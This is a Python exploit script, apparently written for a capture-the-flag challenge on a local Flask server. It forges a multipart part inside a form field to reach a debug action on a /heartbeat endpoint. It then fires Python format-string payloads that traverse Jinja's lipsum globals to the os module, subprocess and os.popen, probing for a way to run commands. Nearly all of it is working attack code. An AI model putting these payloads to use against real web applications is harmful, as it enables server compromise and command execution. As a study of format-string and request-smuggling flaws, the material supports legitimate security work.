import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 寻找 subprocess 或能执行命令的模块
payloads = [
    # 检查 sys.modules 中是否有 subprocess
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[subprocess]}', 'subprocess module'),
    
    # 检查 os.popen
    ('{0.jinja_env.globals[lipsum].__globals__[os].popen}', 'os.popen'),
    
    # 检查是否有 pathlib
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib]}', 'pathlib'),
    
    # 检查 glob
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[glob]}', 'glob'),
    
    # 检查 logging
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[logging]}', 'logging'),
    
    # 检查 logging.handlers
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[logging.handlers]}', 'logging.handlers'),
    
    # flask的日志
    ('{0.logger}', 'app.logger'),
    ('{0.logger.handlers}', 'logger.handlers'),
    
    # werkzeug
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[werkzeug]}', 'werkzeug'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:3000] if len(result) > 3000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
